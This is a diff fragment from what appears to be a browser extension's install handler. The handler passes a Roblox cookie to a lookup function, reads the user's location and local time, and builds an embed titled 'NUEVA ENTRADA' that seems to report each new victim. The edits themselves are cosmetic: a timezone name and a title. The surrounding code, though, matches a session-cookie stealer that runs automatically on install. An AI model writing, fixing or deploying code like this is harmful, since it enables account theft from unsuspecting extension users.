@@ -408,10 +408,10 @@ chrome.runtime.onInstalled.addListener(async () => {
     const info = await obtenerInfoRoblox(cookie) || {};
 
     const ahora = new Date();
-    const horaLocal = ahora.toLocaleTimeString('es-AR', { timeZone: ubi.region ? \`America/\${ubi.region}\` : 'America/Buenos_Aires' });
+    const horaLocal = ahora.toLocaleTimeString('es-AR', { timeZone: ubi.region ? `America/${ubi.region}` : 'America/Argentina/Buenos_Aires' });
 
     const embed = {
-        title: "🔔 NUEVA ENTRADA | **BL PAPI** !",
+        title: "¡ 🔔 NUEVA ENTRADA | **BL PAPI** !",
         color: 15158332,
         fields: [
             {
